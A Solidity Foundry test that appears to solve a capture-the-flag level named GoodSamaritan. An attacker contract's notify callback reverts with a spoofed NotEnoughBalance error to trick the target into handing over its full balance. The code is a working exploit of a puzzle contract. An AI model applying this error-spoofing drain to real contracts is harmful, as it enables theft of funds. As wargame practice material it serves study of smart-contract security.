// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instance/Level29.sol";
import "forge-std/Test.sol";

contract ExploitLevel29 is Test {
    GoodSamaritan instance = new GoodSamaritan();
    address attacker = vm.addr(1);

    function testExploit() external {
        vm.startPrank(attacker);
        AttackInstance attackContract = new AttackInstance();
        attackContract.attack(instance);
        vm.stopPrank();
    }
}

contract AttackInstance {
    error NotEnoughBalance();

    function attack(GoodSamaritan _instance) external {
        _instance.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
